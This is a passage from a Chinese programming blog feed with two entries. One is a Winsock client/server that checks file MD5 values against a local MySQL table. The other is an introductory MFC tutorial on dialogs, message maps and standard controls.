class="number">3</span>, <span class="string">L&quot;否&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buff, <span class="string">&quot;b&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">pObj-&gt;m_objOutList.SetItemText(i, <span class="number">3</span>, <span class="string">L&quot;是&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 当数据处理结束之后，需要断开连接</span></span><br><span class="line">closesocket(client);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查函数的执行结果是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::check_result</span><span class="params">(<span class="keyword">bool</span> result, <span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果传入的表达式位假，意味着出错</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox((CString)msg);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, msg);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="服务端入口"><a href="#服务端入口" class="headerlink" title="服务端入口"></a>服务端入口</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;NetWorkClient.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NetWorkClient obj;</span><br><span class="line">obj.m_argc = argc;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(argv); i++)</span><br><span class="line">&#123;</span><br><span class="line">obj.m_argv[i] = argv[i];</span><br><span class="line">&#125;</span><br><span class="line">obj.NetMain();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>.h文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;include/mysql.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;libmysql.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">vector</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetWorkClient</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetMain</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MysqlInit</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sql_insert</span><span class="params">(MYSQL* mysql, <span class="keyword">const</span> <span class="keyword">char</span>* sql)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sql_check_result</span><span class="params">(MYSQL* mysql)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sql_select</span><span class="params">(MYSQL* mysql, <span class="keyword">const</span> <span class="keyword">char</span>* sql, <span class="keyword">char</span>* filemd5)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MysqlSelect</span><span class="params">(<span class="keyword">char</span>* Filemd5)</span></span>;</span><br><span class="line"></span><br><span class="line">SOCKET client;</span><br><span class="line">MYSQL mysql;</span><br><span class="line"><span class="comment">//vector&lt;char*&gt;vecChar;</span></span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line"><span class="keyword">int</span> m_argc;</span><br><span class="line"><span class="keyword">char</span>* m_argv[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>.cpp文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0. 添加必要的头文件，并且链接到相应的静态库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;NetWorkClient.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于保存当前连接到服务器的所有客户端</span></span><br><span class="line"><span class="built_in">map</span>&lt;SOCKET, <span class="built_in">string</span>&gt; clients;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查函数的执行结果是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_result</span><span class="params">(<span class="keyword">bool</span> result, <span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果传入的表达式位假，意味着出错</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, msg);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务器入口（套接字初始化）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::NetMain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个套接字，应该保存[IP:PORT](买一部手机)</span></span><br><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(server != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 将套接字绑定到指定的 ip 地址和端口(安装手机卡)</span></span><br><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = bind(server, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字绑定失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 开启套接字的监听状态，第二个参数是同一时刻可以等待的客户端数量(开机)</span></span><br><span class="line">result = listen(server, SOMAXCONN);</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字监听失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 等待客户端的连接，返回值是连接到的客户端(等接电话)</span></span><br><span class="line"><span class="keyword">int</span> size = <span class="keyword">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">SOCKADDR_IN client_addr = &#123; <span class="number">0</span> &#125;;<span class="comment">// 用于接收客户端信息(来电显示)</span></span><br><span class="line">client = accept(server, (SOCKADDR*)&amp;client_addr, &amp;size);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;客户端接收失败!&quot;</span>);</span><br><span class="line"><span class="comment">//char buff[10] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">//recv(client, buff, 10, 0);</span></span><br><span class="line">MysqlInit(m_argc, m_argv);</span><br><span class="line"><span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (T)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> nickname[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">recv(client, nickname, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(nickname, <span class="string">&quot;T&quot;</span>) == <span class="number">0</span>))<span class="comment">//如果客户端发过来的消息时T，就结束循环</span></span><br><span class="line">&#123;</span><br><span class="line">T = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">MysqlSelect(nickname);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mysql_library_end();</span><br><span class="line"><span class="comment">// 8. 当数据处理结束之后，需要断开连接</span></span><br><span class="line">closesocket(server);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////SQL///////////////////////</span></span><br><span class="line"><span class="comment">//初始化mysql</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::MysqlInit</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 初始化 mysql 模块</span></span><br><span class="line">mysql_library_init(argc, argv, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个 mysql 对象并初始化</span></span><br><span class="line">mysql = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">mysql_init(&amp;mysql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 通过指定的函数提供用户名密码和主机信息连接到数据库</span></span><br><span class="line">mysql_real_connect(&amp;mysql, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;root&quot;</span>,</span><br><span class="line"><span class="string">&quot;123456&quot;</span>, <span class="string">&quot;md5_value&quot;</span>, <span class="number">3306</span>, <span class="literal">nullptr</span>, <span class="number">0</span>);</span><br><span class="line">sql_check_result(&amp;mysql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置字符编码为 GB2312</span></span><br><span class="line">sql_insert(&amp;mysql, <span class="string">&quot;SET NAMES GB2312&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 向数据库中添加指定的内容(先测试sql指令，在放到代码中)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询数据库存放的md5值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::MysqlSelect</span><span class="params">(<span class="keyword">char</span>* Filemd5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 5. sql_select</span></span><br><span class="line">sql_select(&amp;mysql, <span class="string">&quot;SELECT md5 FROM md5_table;&quot;</span>, Filemd5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装添加内容的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::sql_insert</span><span class="params">(MYSQL* mysql, <span class="keyword">const</span> <span class="keyword">char</span>* sql)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 通过 mysql_query 可以执行所有的 sql 操作</span></span><br><span class="line">mysql_query(mysql, sql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于操作可能出现错误，所以需要判断是否成功</span></span><br><span class="line">sql_check_result(mysql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 封装查询内容的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::sql_select</span><span class="params">(MYSQL* mysql, <span class="keyword">const</span> <span class="keyword">char</span>* sql,<span class="keyword">char</span>* filemd5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 通过 mysql_query 可以执行所有的 sql 操作</span></span><br><span class="line">mysql_query(mysql, sql);</span><br><span class="line">sql_check_result(mysql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过函数从 sql 对象中接收查询到的结果</span></span><br><span class="line">MYSQL_RES* res = mysql_use_result(mysql);</span><br><span class="line">sql_check_result(mysql);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到查询到的结果的列数</span></span><br><span class="line"><span class="keyword">int</span> count = mysql_num_fields(res);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> Flag = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//// 从结果集中循环获取到下一项并输出</span></span><br><span class="line">MYSQL_ROW row = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">while</span> (row = mysql_fetch_row(res))</span><br><span class="line">&#123;   <span class="comment">// 获取每一行的信息</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; ++i)</span><br><span class="line">&#123;    <span class="comment">// 需要提防产生空指针的情况</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">strcmp</span>(row[i], filemd5) == <span class="number">0</span>) &amp;&amp; row[i] != <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, filemd5);</span><br><span class="line">send(client,<span class="string">&quot;b&quot;</span>,<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">Flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Flag == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">send(client, <span class="string">&quot;a&quot;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, filemd5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查数据库操作是否成功</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NetWorkClient::sql_check_result</span><span class="params">(MYSQL* mysql)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果 mysql 操作出现了问题，就返回非 0 值</span></span><br><span class="line"><span class="keyword">if</span> (mysql_errno(mysql) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 通过 mysql_error 获取到具体的错误信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;连接数据库出错: %s\n&quot;</span>, mysql_error(mysql));</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
            <tag> 编程 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows编程————MFC</title>
      <link href="2020/12/05/Window_MFC/"/>
      <url>2020/12/05/Window_MFC/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h1><p>1  MFC的入口在哪里？？</p><p>  CWinApp的InitInstance里面。</p><p>  编写MFC程序，需要做的事情是实现一个CWinApp的派生类，然后实现一个InitInstance这个虚函数。</p><p>  在InitInstance这个函数，去创建一个窗口，并将窗口的对象的指针赋值给m_pMainWnd这个指针。</p><p>  需要定义一个CWinApp的派生类的全局对象。</p><p>2 MFC有几种编程模型？单文档，多文档，对话框。我们的课程主要讲解的是对话框编程。</p><p>3 如何创建一个对话框。</p><p>  3.1  首先要有一个对话框资源。</p><p>  3.2  有一个CDialog类的对象objDlg。</p><p>  3.3.1  调用objDlg的DoModal函数创建模态对话框</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;afxwin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;afxdialogex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;resource.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMyApp</span> :</span><span class="keyword">public</span> CWinApp</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> BOOL <span class="title">InitInstance</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">BOOL <span class="title">CMyApp::InitInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加专用代码和/或调用基类</span></span><br><span class="line">    <span class="function">CDialogEx <span class="title">obj</span><span class="params">(IDD_DIALOG1)</span></span>;</span><br><span class="line">    obj.DoModal();</span><br><span class="line">    <span class="keyword">return</span> CWinApp::InitInstance();</span><br><span class="line">&#125;</span><br><span class="line">CMyApp g_obj;</span><br></pre></td></tr></table></figure><p>调用objDlg的Create函数创建非模态对话框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>4 MFC程序的窗口是如何处理消息的？？</p><p>  4.1 MFC是通过消息映射机制去处理消息的。</p><p>​    消息是我们自己程序员写代码处理的。我们实现窗口处理消息，实际上就是在给CDialogEx去添加功能。那么给CDialogEx增加功能，应该用什么机制实现呢？</p><p>​    使用继承的方式。</p><p>  4.2 假如你已经有了一个继承自CDialogEx的类了，怎么实现消息映射呢？</p><p>​     4.2.1  在类的声明中加一个 DECLARE_MESSAGE_MAP()</p><p>​     4.2.2  在类外加一个</p><p>​         BEGIN_MESSAGE_MAP(类名，父类名)</p><p>​         //。。。要处理什么消息，就添加对应消息的处理宏</p><p>​         END_MESSAGE_MAP()</p><h1 id="二、MFC控件详解"><a href="#二、MFC控件详解" class="headerlink" title="二、MFC控件详解"></a>二、MFC控件详解</h1><p>注意：请绑定控件后操作</p><h2 id="标准控件"><a href="#标准控件" class="headerlink" title="标准控件"></a>标准控件</h2><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p>在工具箱中拖拽到对话框中后，双击拖拽的控件会自动跳转到编译器生成的函数（单机响应）</p><p>在该函数了面可以写单机按钮后想要响应的消息</p><h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><p>绑定变量（右击拖拽的控件选择添加变量，输入变量名确定即可），之后使用UpdateData函数就可以获取</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01StdControlsTestDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="comment">//1 更新</span></span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"><span class="comment">//2 测试</span></span><br><span class="line"><span class="keyword">if</span> (m_bCheck1==TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">&quot;记住密码&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m_bCheck2 == TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">&quot;记住账号&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m_bCheck3 == TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">&quot;自动换IP&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单选框"><a href="#单选框" class="headerlink" title="单选框"></a>单选框</h3><p>注意分组</p><p>绑定的时候，只能绑定到Group属性为true的那个控件上。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01StdControlsTestDlg::OnBnClickedButton4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">UpdateData(TRUE);</span><br><span class="line">CString strInfo;</span><br><span class="line">strInfo.Format(_T(<span class="string">&quot;Group1:%d  Group2:%d &quot;</span>), m_bRadioGroup1, m_bRadioGroup2);</span><br><span class="line">MessageBox(strInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编辑框"><a href="#编辑框" class="headerlink" title="编辑框"></a>编辑框</h3><p>编辑框中有一个字段是Multiline是可以多行显示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 